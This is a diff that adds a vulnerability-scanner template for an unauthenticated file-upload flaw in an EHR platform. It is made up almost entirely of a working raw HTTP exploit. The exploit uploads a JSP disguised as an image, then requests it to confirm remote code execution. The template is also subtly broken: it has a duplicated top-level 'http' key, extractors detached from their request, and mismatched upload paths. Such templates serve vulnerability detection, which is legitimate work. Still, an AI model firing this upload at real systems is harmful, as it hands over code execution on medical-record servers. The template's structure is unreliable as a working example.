@@ -1,0 +1,52 @@
+id: ehr-unauthorized-upload
+info:
+  name: EHR Unauthorized File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The EHR system has an unauthorized upload interface allowing attackers to upload webshells for remote code execution.
+  tags: file-upload,rce
+  classification:
+    cvss-score: 8.0
+http:
+  - raw:
+      - |
+        POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4
+
+        ------WebKitFormBoundaryt7WbDl1tXogoZys4
+        Content-Disposition: form-data; name="fj_file"; filename="test123.jsp"
+        Content-Type: image/jpeg
+
+        <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryt7WbDl1tXogoZys4--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "fileName"
+  - extractors:
+      - type: regex
+        name: uploaded-file-path
+        part: body
+        group: 1
+        regex:
+          - "/uploadfile\\.(.*?).jsp"
+http:
+  - raw:
+      - |
+        GET /uploadfile{{uploaded-file-path}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
